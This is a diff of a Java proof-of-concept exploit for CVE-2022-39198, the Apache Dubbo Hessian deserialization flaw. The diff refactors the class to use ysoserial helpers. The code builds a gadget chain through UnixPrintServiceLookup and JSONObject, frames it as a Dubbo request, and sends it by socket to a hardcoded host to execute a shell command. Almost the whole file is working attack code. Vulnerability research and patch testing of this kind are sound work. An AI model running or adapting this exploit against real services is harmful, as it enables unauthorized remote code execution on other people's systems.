@@ -1,9 +1,9 @@
 package cve;
 
+
 import com.alibaba.com.caucho.hessian.io.Hessian2Output;
-import com.alibaba.com.caucho.hessian.io.HessianInput;
-import com.alibaba.com.caucho.hessian.io.HessianOutput;
 import com.alibaba.com.caucho.hessian.io.SerializerFactory;
+
 import com.sun.org.apache.xpath.internal.objects.XString;
 import org.apache.dubbo.common.io.Bytes;
 import org.apache.dubbo.common.json.JSONObject;
@@ -11,38 +11,34 @@ import sun.misc.Unsafe;
 import sun.print.UnixPrintServiceLookup;
 
 import java.io.ByteArrayOutputStream;
-import java.io.IOException;
 import java.io.OutputStream;
-import java.lang.reflect.Array;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
-import java.lang.reflect.InvocationTargetException;
 import java.net.Socket;
 import java.util.HashMap;
 import java.util.Random;
 
+import ysoserial.payloads.util.Gadgets;
+import ysoserial.payloads.util.Reflections;
+
 /**
- * 测试版本 dubbo 2.7.6
+ * 测试版本: dubbo 2.7.17
+ * 修复版本: dubbo 2.7.18
  */
 public class CVE_2022_39198 {
 
-    public static void setFieldValue(Object obj, String filedName, Object value) throws NoSuchFieldException, IllegalAccessException {
-        Field declaredField = obj.getClass().getDeclaredField(filedName);
-        declaredField.setAccessible(true);
-        declaredField.set(obj, value);
-    }
+    static String dubbo_ip = "10.58.120.200";
+    static int dubbo_port = 20880;
+    static String cmd = "touch /tmp/success";
 
-    public static void setPayload(Hessian2Output hessian2Output,String cmd) throws InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException, NoSuchMethodException, IOException {
 
-        Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
-        theUnsafe.setAccessible(true);
-        Unsafe unsafe = (Unsafe) theUnsafe.get(null);
+    public static void setPayload(Hessian2Output hessian2Output,String cmd) throws Exception {
+
+        Unsafe unsafe = (Unsafe) Reflections.getField(Unsafe.class,"theUnsafe").get(null);
         Object unixPrintServiceLookup = unsafe.allocateInstance(UnixPrintServiceLookup.class);
         //绕过getDefaultPrinterNameBSD中的限制
         //设置属性
-        setFieldValue(unixPrintServiceLookup, "cmdIndex", 0);
-        setFieldValue(unixPrintServiceLookup, "osname", "xx");
-        setFieldValue(unixPrintServiceLookup, "lpcFirstCom", new String[]{cmd, cmd, cmd});
+        Reflections.setFieldValue(unixPrintServiceLookup, "cmdIndex", 0);
+        Reflections.setFieldValue(unixPrintServiceLookup, "osname", "xx");
+        Reflections.setFieldValue(unixPrintServiceLookup, "lpcFirstCom", new String[]{cmd, cmd, cmd});
         //封装一个JSONObject对象调用getter方法
         JSONObject jsonObject = new JSONObject();
         jsonObject.put("xx", unixPrintServiceLookup);
@@ -55,62 +51,42 @@ public class CVE_2022_39198 {
         map2.put("yy",xString);
         map2.put("zZ",jsonObject);
 
-        HashMap s = new HashMap();
-        setFieldValue(s, "size", 2);
-        Class nodeC;
-        try {
-            nodeC = Class.forName("java.util.HashMap$Node");
-        }
-        catch ( ClassNotFoundException e ) {
-            nodeC = Class.forName("java.util.HashMap$Entry");
-        }
+        HashMap hashMap = Gadgets.makeMap(map1, map2);
 
-        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
-        nodeCons.setAccessible(true);
-
-        Object tbl = Array.newInstance(nodeC, 2);
-        Array.set(tbl, 0, nodeCons.newInstance(0, map1, map1, null));
-        Array.set(tbl, 1, nodeCons.newInstance(0, map2, map2, null));
-        setFieldValue(s, "table", tbl);
-
-        hessian2Output.writeObject(s);
+        hessian2Output.writeObject(hashMap);
     }
-    public static void main(String[] args) {
-        try {
 
-            ByteArrayOutputStream dubbo_data = new ByteArrayOutputStream();
-            // header.
-            byte[] dubbo_header = new byte[16];
-            // set magic number.
-            Bytes.short2bytes((short) 0xdabb, dubbo_header);
-            // set request and serialization flag.
-            dubbo_header[2] = (byte) ((byte) 0x80 | 2);
+    public static void main(String[] args) throws Exception {
 
-            // set request id.
-            Bytes.long2bytes(new Random().nextInt(100000000), dubbo_header, 4);
 
-            ByteArrayOutputStream dubbo_body = new ByteArrayOutputStream();
-            Hessian2Output hessian2Output = new Hessian2Output(dubbo_body);
-            hessian2Output.setSerializerFactory(new SerializerFactory());
-            hessian2Output.getSerializerFactory().setAllowNonSerializable(true);
-            //todo 此处填写需要在Linux主机上执行的命令
-            setPayload(hessian2Output,"touch /tmp/success");
-            hessian2Output.flushBuffer();
+        // header.
+        byte[] dubbo_header = new byte[16];
+        // set magic number.
+        Bytes.short2bytes((short) 0xdabb, dubbo_header);
+        // set request and serialization flag.
+        dubbo_header[2] = (byte) ((byte) 0x80 | 2);
 
-            Bytes.int2bytes(dubbo_body.size(), dubbo_header, 12);
-            dubbo_data.write(dubbo_header);
-            dubbo_data.write(dubbo_body.toByteArray());
+        // set request id.
+        Bytes.long2bytes(new Random().nextInt(100000000), dubbo_header, 4);
 
-            byte[] bytes = dubbo_data.toByteArray();
-            //todo 此处填写Dubbo服务地址及端口
-            Socket socket = new Socket("10.58.120.200", 20880);
-            OutputStream outputStream = socket.getOutputStream();
-            outputStream.write(bytes);
-            outputStream.flush();
-            outputStream.close();
+        ByteArrayOutputStream bodyBaos = new ByteArrayOutputStream();
+        Hessian2Output body = new Hessian2Output(bodyBaos);
+        body.setSerializerFactory(new SerializerFactory());
+        body.getSerializerFactory().setAllowNonSerializable(true);
+        setPayload(body,cmd);
+        body.flushBuffer();
 
-        }catch (Exception e) {
-            e.printStackTrace();
-        }
+        Bytes.int2bytes(bodyBaos.size(), dubbo_header, 12);
+        ByteArrayOutputStream totalBaos = new ByteArrayOutputStream();
+        totalBaos.write(dubbo_header);
+        totalBaos.write(bodyBaos.toByteArray());
+
+        byte[] bytes = totalBaos.toByteArray();
+        Socket socket = new Socket(dubbo_ip, dubbo_port);
+        OutputStream outputStream = socket.getOutputStream();
+        outputStream.write(bytes);
+        outputStream.flush();
+        outputStream.close();
+
     }
 }
